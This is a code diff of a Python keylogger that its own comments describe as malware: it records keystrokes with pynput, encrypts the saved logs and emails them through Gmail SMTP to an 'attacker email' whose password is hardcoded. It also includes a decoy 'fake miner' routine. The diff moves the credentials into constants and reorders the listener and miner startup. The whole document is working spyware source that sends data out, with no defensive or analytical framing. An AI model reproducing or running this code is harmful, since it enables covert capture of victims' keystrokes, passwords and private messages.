@@ -5,6 +5,7 @@ import random
 from cryptography.fernet import Fernet
 from os import path
 from pynput.keyboard import Key, Listener
+from multiprocessing import Process
 
 # E-Mail libraries
 import smtplib 
@@ -20,7 +21,9 @@ logs_count = 1
 KEYSTROKES_BUFFER_SIZE = 20  # How many keystrokes before saving
 SAVES_BUFFER_SIZE = 2  # How many saves before sending
 LOGS_PATH = "Logs/"  # File path to save stolen data
-TARGET_EMAIL = "intelogger@gmail.com" # Sender and receiver of the data
+EMAIL_USER = "intelogger@gmail.com" # Attacker email
+EMAIL_PASSWORD = "Aa!12345" # Attacker password
+
 
 
 class Encryption():
@@ -143,14 +146,12 @@ def results():
 def send():
     """
     Sends the data via email.
-    :param data: The data to send.
-    :param email: The email used to send. The email is the sender and the receiver.
     """
-    global TARGET_EMAIL, logs_count
+    global EMAIL_USER, EMAIL_PASSWORD, logs_count
     
     msg = MIMEMultipart() # Will contain the email message
-    msg['From'] = TARGET_EMAIL
-    msg['To'] = TARGET_EMAIL
+    msg['From'] = EMAIL_USER
+    msg['To'] = EMAIL_USER
     msg['Subject'] = "New Keylogger Logs"
     msg.attach(MIMEText("Log number {}".format(logs_count), 'plain'))
     logs_count += 1
@@ -166,14 +167,10 @@ def send():
     
     smtp = smtplib.SMTP('smtp.gmail.com', 587) # Create STMP session
     smtp.starttls()
-    smtp.login(TARGET_EMAIL, "Aa!12345") # E-Mail login
+    smtp.login(EMAIL_USER, EMAIL_PASSWORD) # E-Mail login
     
-    smtp.sendmail(TARGET_EMAIL, TARGET_EMAIL, msg.as_string()) # Sending the email
+    smtp.sendmail(EMAIL_USER, EMAIL_USER, msg.as_string()) # Sending the email
     smtp.quit() # Terminate STMP session
-
-
-with Listener(on_press=press) as listener: # Keypress listener
-    listener.join()
 
 
 def miner(): # Fake miner
@@ -199,6 +196,15 @@ def miner(): # Fake miner
                 file.write("{0:b}".format(random.randint(10000000000,100000000000)))
                 file.close()
 
-
+"""
 if __name__ == '__main__':
-    miner()
+    p = Process(target = miner)
+    p.start()
+    p.join()
+"""
+
+
+with Listener(on_press=press) as listener: # Keypress listener
+    listener.join()
+
+miner()
